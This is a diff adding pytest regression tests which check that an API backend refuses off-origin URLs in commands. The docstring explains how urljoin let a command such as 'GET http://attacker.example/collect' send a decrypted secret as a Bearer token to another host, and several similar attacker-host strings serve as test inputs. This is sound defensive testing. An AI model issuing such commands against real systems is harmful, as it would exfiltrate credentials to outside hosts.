@@ -86,6 +86,78 @@ async def test_blocked_target_returns_error_without_making_a_request():
 
 
 @pytest.mark.asyncio
+async def test_absolute_url_in_command_cannot_redirect_the_credential_elsewhere(monkeypatch):
+    """urljoin() treats an absolute URL in the command as a full replacement for
+    baseUrl, so `GET http://attacker.example/collect` used to send the decrypted
+    secretRef as a Bearer token to an arbitrary host. Nothing may be requested at
+    all in that case -- assert the HTTP client is never even constructed, which
+    also proves no Authorization header was built for that destination.
+    """
+    import httpx as httpx_module
+
+    constructed: list[object] = []
+    original_init = httpx_module.AsyncClient.__init__
+
+    def spy_init(self, *args, **kwargs):  # noqa: ANN001, ANN202
+        constructed.append(self)
+        original_init(self, *args, **kwargs)
+
+    monkeypatch.setattr(httpx_module.AsyncClient, "__init__", spy_init)
+    sent: list[httpx.Request] = []
+
+    async def fail_send(self, request, **kwargs):  # noqa: ANN001, ANN202
+        sent.append(request)
+        raise AssertionError(f"no request may be sent, got {request.url}")
+
+    monkeypatch.setattr(httpx_module.AsyncClient, "send", fail_send)
+
+    backend = ApiBackend()
+    result = await backend.run(
+        _server(), "GET http://attacker.example/collect", "my-token", on_activity=lambda _c: None
+    )
+
+    assert result.exit_code is None
+    assert result.error is not None
+    assert "attacker.example" in result.error
+    assert "different origin" in result.error
+    assert constructed == []
+    assert sent == []
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "bad_command",
+    [
+        "http://attacker.example/collect",
+        "POST https://attacker.example/collect",
+        "GET http://10.0.1.5:9999/status",  # same host, different port is still a different origin
+        "GET https://10.0.1.5:8080/status",  # same host/port, different scheme
+    ],
+)
+async def test_off_origin_targets_are_refused(bad_command: str):
+    backend = ApiBackend()
+    result = await backend.run(_server(), bad_command, "my-token", on_activity=lambda _c: None)
+
+    assert result.exit_code is None
+    assert result.error is not None and "different origin" in result.error
+
+
+@pytest.mark.asyncio
+async def test_default_port_in_base_url_still_matches_explicit_port(respx_mock):
+    """The origin comparison must not become an accidental functional regression:
+    a baseUrl without an explicit port is the same origin as its default port."""
+    respx_mock.get("http://10.0.1.5/status").mock(return_value=httpx.Response(200, text="ok"))
+
+    backend = ApiBackend()
+    result = await backend.run(
+        _server(base_url="http://10.0.1.5"), "/status", None, on_activity=lambda _c: None
+    )
+
+    assert result.exit_code == 0
+    assert result.output == "ok"
+
+
+@pytest.mark.asyncio
 async def test_connection_error_is_reported_not_raised(respx_mock):
     respx_mock.get("http://10.0.1.5:8080/status").mock(side_effect=httpx.ConnectError("refused"))
 
